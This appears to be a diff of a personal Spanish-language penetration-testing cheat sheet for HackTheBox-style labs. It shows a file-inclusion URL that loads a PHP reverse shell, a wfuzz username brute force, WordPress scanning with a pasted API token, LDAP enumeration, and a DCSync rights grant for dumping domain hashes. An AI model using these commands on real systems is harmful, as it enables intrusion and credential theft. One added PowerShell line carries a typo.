@@ -97,6 +97,8 @@ http://10.10.10.55/?file=../../../../var/lib/tftpboot/rev.php
 escaneo agresivo de wordpress
 wpscan --url http://10.10.10.88/webservices/wp/ -e ap --api-token  hz6s59smi5hjaWUXjdx1brjEGW08CQsBrOGFWP3lTmc --plugins-detection aggressive  
 
+wfuzz -z file,/usr/share/seclists/Usernames/Names/names.txt -d "username=FUZZ&password=1234567" --hs "No account found with that username" http://10.10.10.97/login.php
+
 ************************************************************Arquitectura de sistesmas operativos***************************
 
 Windows wmic OS get OSArchitecture
@@ -335,6 +337,9 @@ ldapsearch -h 10.10.10.161 -x -b "DC=htb,DC=local" '(objectClass=User)' sAMAccou
 
 después de haber creado un usuario y contraseña en el dominio, después de haberlo agregado a un grupo de administración, se ejecuta este comando, para extraer hashes con secretsdump.py
 Add-DomainObjectAcl -Credential $Cred -TargetIdentity htb.local -Rights DCSync
+
+contenido de un archivo powershell
+Get-Content user.txt | Measure-Objec -Character
 
 ************************************************Enumeracion
 LinEnum.py en linux
